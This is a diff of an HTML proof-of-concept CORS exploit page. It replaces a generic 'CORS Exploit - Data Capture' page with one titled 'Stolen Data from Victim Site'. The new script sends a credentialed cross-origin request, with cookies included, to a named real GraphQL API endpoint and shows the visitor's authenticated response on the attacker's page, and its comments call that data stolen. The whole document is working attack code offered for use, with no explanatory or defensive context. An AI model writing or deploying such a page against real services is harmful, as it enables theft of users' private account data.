@@ -2,51 +2,45 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit - Data Capture</title>
-    <style>
-        body { font-family: Arial, sans-serif; }
-        #response { white-space: pre-wrap; margin-top: 20px; }
-    </style>
-    <script>
-        function fetchData() {
-            var xhr = new XMLHttpRequest();
-            var url = '';
-
-            // Add unique timestamp to bypass caching
-            url += '&t=' + new Date().getTime();
-
-            xhr.open('GET', url, true);
-            xhr.withCredentials = true;
-
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    // Success: display the captured data
-                    var responseData = xhr.responseText;
-                    document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
-                } else {
-                    // Error: log status and statusText
-                    console.error('Request failed with status:', xhr.status, xhr.statusText);
-                    document.getElementById('response').textContent = 'Error: ' + xhr.status + ' ' + xhr.statusText;
-                }
-            };
-
-            xhr.onerror = function() {
-                console.error('Network or CORS error occurred');
-                document.getElementById('response').textContent = 'Network or CORS error occurred.';
-            };
-
-            console.log('Sending request to:', url); // Debugging: Log the request URL
-            xhr.send();
-        }
-
-        // Fetch data on page load
-        window.onload = fetchData;
-    </script>
+    <title>Stolen Data</title>
 </head>
 <body>
-    <h1>CORS Exploit - Data Capture</h1>
-    <div id="response">Waiting for data...</div>
+    <h1>Stolen Data from Victim Site</h1>
+    <div id="stolen-data">
+        <!-- Stolen data will appear here -->
+    </div>
+
+    <script>
+        // Create an XMLHttpRequest object to make a request to the victim's site
+        var xhr = new XMLHttpRequest();
+        
+        // Open a GET request to the target URL on the vulnerable site
+        xhr.open('GET', 'https://www.vrt.be/vrtnu-api/graphql/v1', true);
+        
+        // Set withCredentials to include cookies and authentication tokens
+        xhr.withCredentials = true;
+        
+        // Handle the response
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                // Get the response text (stolen data)
+                var stolenData = xhr.responseText;
+                
+                // Display the stolen data directly on the attacker's site
+                document.getElementById('stolen-data').innerText = stolenData;
+            } else {
+                document.getElementById('stolen-data').innerText = 'Failed to fetch data.';
+            }
+        };
+        
+        // Handle errors
+        xhr.onerror = function() {
+            document.getElementById('stolen-data').innerText = 'Error occurred while fetching data.';
+        };
+
+        // Send the request
+        xhr.send();
+    </script>
 </body>
 </html>
